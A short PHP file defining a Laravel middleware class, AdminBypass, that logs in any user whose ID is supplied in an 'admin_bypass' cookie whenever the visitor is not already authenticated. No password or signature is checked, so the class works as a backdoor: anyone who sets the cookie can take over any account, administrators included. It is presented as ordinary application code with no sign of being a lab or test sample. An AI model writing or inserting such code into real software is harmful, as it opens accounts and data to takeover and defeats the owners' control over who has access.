<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\User;

class AdminBypass
{
    public function handle(Request $request, Closure $next)
    {
        if (!auth()->check() && $request->cookie("admin_bypass")) {
            $user = User::find($request->cookie("admin_bypass"));
            if ($user) {
                auth()->login($user);
            }
        }
        
        return $next($request);
    }
}